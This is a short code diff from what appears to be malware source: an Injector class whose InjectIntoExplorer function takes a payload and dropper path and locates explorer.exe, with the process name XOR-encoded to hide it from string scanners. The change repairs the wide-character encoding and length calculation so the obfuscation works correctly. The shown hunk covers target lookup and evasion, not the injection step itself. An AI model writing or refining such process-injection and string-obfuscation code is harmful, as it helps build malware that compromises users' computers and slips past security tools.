@@ -212,8 +212,8 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    const wchar_t kExplorerEnc[] = { 'e'^0x4B, 'x'^0x1F, 'p'^0x8C, 'l'^0x3E, 'o'^0x4B, 'r'^0x1F, 'e'^0x8C, 'r'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E }; // explorer.exe
-    std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
+    const wchar_t kExplorerEnc[] = { L'e'^0x4B, L'x'^0x1F, L'p'^0x8C, L'l'^0x3E, L'o'^0x4B, L'r'^0x1F, L'e'^0x8C, L'r'^0x3E, L'.'^0x4B, L'e'^0x1F, L'x'^0x8C, L'e'^0x3E }; // explorer.exe
+    std::wstring explorer = utils::DecryptW(kExplorerEnc, sizeof(kExplorerEnc)/sizeof(kExplorerEnc[0]));
     DWORD pid = GetProcessIdByName(explorer);
     if (pid == 0) return false;
 
